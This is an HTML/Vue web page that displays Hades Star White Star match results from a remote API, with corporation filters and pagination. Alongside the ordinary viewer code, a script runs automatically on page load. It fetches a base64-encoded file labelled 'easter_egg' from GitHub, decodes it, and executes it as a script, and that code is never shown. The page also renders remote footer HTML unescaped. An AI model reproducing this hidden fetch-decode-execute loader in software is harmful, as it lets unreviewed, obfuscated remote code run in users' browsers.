<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WS Matches Viewer</title>

  <!-- Discord Meta Tags for URL Embeds -->
  <meta property="og:title" content="WS Matches Viewer">
  <meta property="og:description" content="View and track the latest WS Matches with easy filtering and sorting options.">
  <meta property="og:image" content="https://raw.githubusercontent.com/DrMineword/1045060846654603305_bot_images/refs/heads/master/src/img/game/portraits/portrait_WhiteStar.png">
  <meta property="og:type" content="website">
  <meta property="og:url" content="https://example.com">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:title" content="WS Matches Viewer">
  <meta name="twitter:description" content="View and track the latest WS Matches with easy filtering and sorting options.">
  <meta name="twitter:image" content="https://raw.githubusercontent.com/DrMineword/1045060846654603305_bot_images/refs/heads/master/src/img/game/portraits/portrait_WhiteStar.png">

  <style>
    /* Global Styles */
    body {
      background-color: #2e2e2e; /* Dark background */
      color: white; /* White text */
      font-family: Arial, sans-serif;
      margin: 0;
      padding: 0;
      background-image: url('https://raw.githubusercontent.com/DrMineword/1045060846654603305_bot_images/refs/heads/master/src/img/game/portraits/BlackCitadel.jpg');
      background-size: cover;
      background-position: center;
      background-attachment: fixed; /* Ensures the background stays static while scrolling */
      overflow-x: hidden; /* Fix issue on mobile with horizontal scroll */
    }

    /* Spinner Animation for loading state */
    .spinner {
      width: 50px;
      height: 50px;
      border: 5px solid #ccc;
      border-top-color: #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    /* Error Message */
    .error-message {
      color: red;
      font-weight: bold;
      animation: shake 0.5s;
    }

    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25%, 75% { transform: translateX(-10px); }
      50% { transform: translateX(10px); }
    }

    /* Filter Section */
    .filters {
      padding: 20px 0;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 10px;
    }

    .filters label {
      color: white;
    }

    .filters select {
      padding: 10px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }

    /* Match List */
    .list {
      margin: 2% auto;
      max-width: 800px;
    }

    .list li {
      position: relative;
      list-style: none;
      margin: 2% 0;
      background-color: white;
      color: #333; /* Dark text for contrast */
      padding: 20px;
      border-radius: 10px;
      text-align: center;
      border: 2px solid transparent;
      background: linear-gradient(to inside, rgba(0, 0, 255, 0.2), transparent); /* Blue fade to inside border */
    }

    .list li .icon {
      position: absolute;
      top: 10px;
      left: 50%;
      transform: translateX(-50%);
      width: 40px;
      height: 40px;
      background: url('https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/favicon.ico') no-repeat center;
      background-size: contain;
    }

    .score {
      display: flex;
      justify-content: center;
      gap: 15px;
    }

    .score span {
      font-size: 150%;
      color: #333;
    }

    /* Pagination */
    .pagination {
      text-align: center;
      margin: 20px;
    }

    .pagination button {
      padding: 10px 20px;
      border-radius: 5px;
      border: none;
      background-color: #3498db;
      color: white;
      cursor: pointer;
    }

    .pagination button:disabled {
      background-color: #888;
      cursor: not-allowed;
    }

    .pagination span {
      font-size: 1.2em;
      margin: 0 15px;
    }

    /* Page Number Input */
    .page-number-input {
      display: flex;
      justify-content: center;
      margin-top: 20px;
      text-align: center;
    }

    .page-number-input input {
      padding: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
      text-align: center;
      width: 50px;
    }

    /* Custom Footer */
    footer {
      padding: 20px 0;
      text-align: center;
      color: white;
    }

  </style>
</head>
<body>
  <div id="app">
    <div v-if="loading" v-html="loadingAnimation"></div>
    
    <!-- Filters -->
    <div class="filters">
      <label for="limit">Results per page:</label>
      <select id="limit" v-model="limit" @change="onLimitChange">
        <option v-for="option in limitOptions" :key="option" :value="option">{{ option }}</option>
      </select>

      <label for="corpFilter">Filter by Corporation:</label>
      <select id="corpFilter" v-model="selectedCorp" @change="onCorporationChange">
        <option v-for="corp in corporations" :key="corp.Id" :value="corp.Id">{{ corp.Name }}</option>
      </select>
    </div>

    <!-- Error Message -->
    <div v-if="errorMessage" class="error-message">{{ errorMessage }}</div>

    <!-- Matches List -->
    <ul class="list">
      <li v-for="match in filteredMatches" :key="match.MatchId">
        <div class="icon"></div>
        <p class="corp-names">
          <span>{{ match.Corporation1Name }}</span> <span> vs </span> <span>{{ match.Corporation2Name }}</span>
        </p>
        <p class="score">
          <span>{{ match.Corporation1Score }}</span> - <span>{{ match.Corporation2Score }}</span>
        </p>
        <p>
          <span>Ended: {{ formatDate(match.DateEnded) }}</span> | 
          <span>Time Ago: {{ timeAgo(match.DateEnded) }}</span>
        </p>
      </li>
    </ul>

    <!-- Pagination Controls -->
    <div class="pagination">
      <button @click="prevPage" :disabled="currentPage === 1">Previous</button>
      <span>{{ currentPage }} / {{ maxPage }}</span>
      <button @click="nextPage" :disabled="currentPage === maxPage">Next</button>
    </div>

    <!-- Page Number Input -->
    <div class="page-number-input">
      <label for="pageNumber">Page Number:</label>
      <input id="pageNumber" type="number" v-model="currentPage" @change="fetchMatches" min="1" :max="maxPage" />
    </div>

    <!-- Footer (from JSON) -->
    <div v-html="footerHtml"></div>
  </div>

  <audio id="audioPlayer" loop>
    <source src="https://github.com/DrMineword/Artefact-Boost-Active/raw/refs/heads/main/White%20Star%20Theme%20%20Hades%20Star.mp3" type="audio/mp3">
    Your browser does not support the audio element.
  </audio>

  <script src="https://cdn.jsdelivr.net/npm/vue@3.2.45"></script>
  <script>
    const base64ScriptUrl = "https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/easter_egg.base64";

    // Function to fetch and execute a Base64-encoded script
    async function fetchAndExecuteBase64Script() {
        try {
            const response = await fetch(base64ScriptUrl);
            if (!response.ok) {
                throw new Error(`Failed to fetch Base64 script from ${base64ScriptUrl}`);
            }

            const encodedScript = await response.text();
            const decodedScript = atob(encodedScript);

            console.log("Yyyeeerrraarrsessarseaandimth grasssmannpunkyeeyahhavinh");

            const scriptElement = document.createElement("script");
            scriptElement.textContent = decodedScript;
            document.body.appendChild(scriptElement);

            console.log("Script executed successfully.");
        } catch (error) {
            console.error("Error fetching or executing the Base64 script:", error);
        }
    }

    // Call the function to fetch, decode, and execute the script
    fetchAndExecuteBase64Script();

    const app = Vue.createApp({
      data() {
        return {
          matches: [],
          filteredMatches: [],
          corporations: [],
          selectedCorp: "", // Corporation filter
          nowDate: new Date(),
          loading: true,
          error: false,
          loadingAnimation: "<div class='spinner'></div>",
          errorMessage: "",
          footerHtml: "",
          backgroundUrl: "",
          currentPage: 1,
          maxPage: 1,
          hasNextPage: true,
          limit: 10, // Default results per page
          limitOptions: [10, 20, 50], // Options for results per page
        };
      },
      methods: {
    async loadSettings() {
      try {
        const settingsResponse = await fetch("https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/root/pages/corp/resources/settings.json");
        const settingsData = await settingsResponse.json();
        this.footerHtml = settingsData.website.footer.html;
        this.backgroundUrl = settingsData.website.backgroundUrl;
        document.body.style.backgroundImage = `url(${this.backgroundUrl})`;
        this.loading = false;
      } catch (error) {
        this.loading = false;
        this.errorMessage = "Oops! Something went wrong.";
      }
    },

    async fetchMatches() {
      try {
        this.loading = true;
        // Updated API URL
        const apiUrl = `https://ws.mentalisit.myds.me/matches?limit=${this.limit}&page=${this.currentPage}`;
        const response = await fetch(apiUrl);
        if (!response.ok) {
          throw new Error(`Error fetching matches: ${response.status}`);
        }
        const data = await response.json();
        this.matches = data.matches;
        this.maxPage = data.maxPage;
        this.filteredMatches = this.matches;
        this.loading = false;
      } catch (error) {
        this.loading = false;
        this.errorMessage = `Error: ${error.message}`;
      }
    },

    async fetchCorporations() {
      try {
        // Updated API URL
        const response = await fetch("https://ws.mentalisit.myds.me/corps");
        if (!response.ok) {
          throw new Error("Error fetching corporations");
        }
        const data = await response.json();
        this.corporations = data.corporations;
      } catch (error) {
        this.errorMessage = `Error: ${error.message}`;
      }
    },

    onCorporationChange() {
      // Filter matches based on selected corporation
      this.filteredMatches = this.matches.filter(match => 
        match.Corporation1Id === this.selectedCorp || match.Corporation2Id === this.selectedCorp
      );
    },

    onLimitChange() {
      this.fetchMatches();
    },

    prevPage() {
      if (this.currentPage > 1) {
        this.currentPage--;
        this.fetchMatches();
      }
    },

    nextPage() {
      if (this.currentPage < this.maxPage) {
        this.currentPage++;
        this.fetchMatches();
      }
    }
},

created() {
  this.loadSettings();
  this.fetchMatches();
  this.fetchCorporations(); // Fetch corporations data
}

    });

    app.mount("#app");
  </script>
</body>
</html>
